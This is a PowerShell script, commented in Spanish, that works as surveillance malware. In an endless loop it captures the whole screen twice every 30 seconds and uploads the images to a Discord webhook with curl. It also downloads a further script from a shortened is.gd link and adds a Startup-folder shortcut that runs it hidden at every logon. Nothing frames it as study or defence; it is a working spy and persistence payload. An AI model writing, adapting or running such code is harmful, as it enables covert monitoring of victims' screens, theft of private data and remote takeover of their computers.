# Definir la URL del webhook de Discord
$hookurl = "$dc"
# Definir el intervalo de tiempo entre capturas de pantalla en segundos
$seconds = 30

# shortened URL Detection
if ($hookurl.Ln -ne 121){
    Write-Host "Shortened Webhook URL Detected.." 
    $hookurl = (irm $hookurl).url
}

# Bucle principal: tomar dos capturas de pantalla cada 30 segundos
While ($true){
    # Definir la ruta y el nombre de archivo para la captura de pantalla
    $file1 = "$env:temp\SC1.png"
    $file2 = "$env:temp\SC2.png"
    
    # Tomar la primera captura de pantalla
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($file1, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Esperar un segundo antes de tomar la segunda captura de pantalla
    Start-Sleep -Seconds 1
    
    # Tomar la segunda captura de pantalla
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($file2, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Enviar ambas capturas de pantalla al webhook de Discord
    curl.exe -F "file1=@$file1" -F "file2=@$file2" $hookurl
    
    # Eliminar las capturas de pantalla después de enviarlas
    Remove-Item -Path $file1
    Remove-Item -Path $file2
    
    # Descargar el script y guardarlo como "sysw.ps1" en la carpeta de documentos
    $scriptURL = "https://is.gd/H8uBqE"
    $scriptPath = Join-Path -Path $env:USERPROFILE -ChildPath "Documents\sysw.ps1"
    Invoke-WebRequest -Uri $scriptURL -OutFile $scriptPath
    
    # Obtener la carpeta de documentos del usuario actual
    $documentsFolder = [Environment]::GetFolderPath("MyDocuments")

    # Ruta completa del archivo de lote para ejecutar el script al iniciar Windows
    $batFilePath = Join-Path -Path $documentsFolder -ChildPath "run_script.bat"
    $batContent = @"
@echo off
powershell.exe -WindowStyle Hidden -File "$scriptPath"
"@
    Set-Content -Path $batFilePath -Value $batContent

    # Obtener la carpeta de inicio del usuario actual
    $startupFolder = [Environment]::GetFolderPath("Startup")

    # Crear un acceso directo del archivo de lote en la carpeta de inicio para que se ejecute al iniciar Windows
    $shortcutPath = Join-Path -Path $startupFolder -ChildPath "Run_Script.lnk"
    $WScriptShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
    $Shortcut.TargetPath = $batFilePath
    $Shortcut.Save()

    # Esperar el intervalo de tiempo especificado antes de tomar las próximas capturas de pantalla
    Start-Sleep -Seconds $seconds
}
